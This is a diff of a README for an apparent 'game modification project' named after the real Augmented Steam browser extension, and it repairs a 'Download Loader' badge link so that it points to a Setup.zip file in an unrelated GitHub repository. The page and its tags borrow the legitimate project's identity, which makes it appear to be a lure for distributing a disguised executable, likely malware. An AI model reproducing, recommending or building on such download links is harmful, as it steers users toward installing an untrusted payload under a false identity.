@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Augmented Steam
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Augmented-Steam` · Updated: 2026-10-25
 
 **Tags:** `steam` `browser-extension` `enhancement` `store` `market` `community` `steam-db` `price-history`
+
 
